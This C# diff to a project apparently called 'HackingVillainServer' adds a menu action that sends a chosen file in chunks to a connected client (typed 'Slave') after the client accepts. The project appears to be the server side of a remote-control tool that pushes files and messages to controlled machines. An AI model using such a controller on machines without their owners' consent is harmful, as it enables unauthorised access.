@@ -22,6 +22,8 @@ namespace HackingVillainServer
         private List<Slave> _clients = new List<Slave>();
         Thread _listen;
         bool _ViewrClosed = true;
+        bool _waitForFile = false;
+        string _filePath = "";
         public Form1()
         {
             InitializeComponent();
@@ -166,13 +168,31 @@ namespace HackingVillainServer
                     }
                 }
             }
+            if (type == 8) // 파일 수락
+            {
+                if (_waitForFile)
+                {
+                    _waitForFile = false;
+                    Send(_clients[0].Socket, File.ReadAllBytes(_filePath), 1);
+                }
+            }
+        }
+
+        public static void Send(ISocket client, byte[] msg, int dataType)
+        {
+            Buffer b = Buffer.New();
+            var datas = Data.SplitToDatas(msg, dataType);
+            foreach (var dd in datas)
+            {
+                Buffer.Add(b, dd.Serialize());
+                Buffer.FinalizeBuffer(b);
+                client.SendMessage(b);
+            }
         }
 
         public void Send(string msg)
         {
-            Buffer b = Buffer.New();
-            Buffer.Add(b, Encoding.UTF8.GetBytes(msg));
-            _clients[0].Socket.SendMessage(b);
+            Send(_clients[0].Socket, Encoding.UTF8.GetBytes(msg), 0);
         }
 
         private void 키보드KToolStripMenuItem_Click(object sender, EventArgs e)
@@ -251,6 +271,31 @@ namespace HackingVillainServer
                 msgForm.Close();
             };
             msgForm.Show();
+        }
+
+        private void 파일FToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            var dialog = new OpenFileDialog();
+            if (dialog.ShowDialog() == DialogResult.OK)
+            {
+                _waitForFile = true;
+                _filePath = dialog.FileName;
+
+                string name = Path.GetFileName(dialog.FileName);
+                string size = BytesToString(new FileInfo(dialog.FileName).Length);
+                Send($"File {name}\n{size})");
+            }
+        }
+
+        static String BytesToString(long byteCount)
+        {
+            string[] suf = { "B", "KB", "MB", "GB", "TB", "PB", "EB" }; //Longs run out around EB
+            if (byteCount == 0)
+                return "0" + suf[0];
+            long bytes = Math.Abs(byteCount);
+            int place = Convert.ToInt32(Math.Floor(Math.Log(bytes, 1024)));
+            double num = Math.Round(bytes / Math.Pow(1024, place), 1);
+            return (Math.Sign(byteCount) * num).ToString() + suf[place];
         }
     }
 }
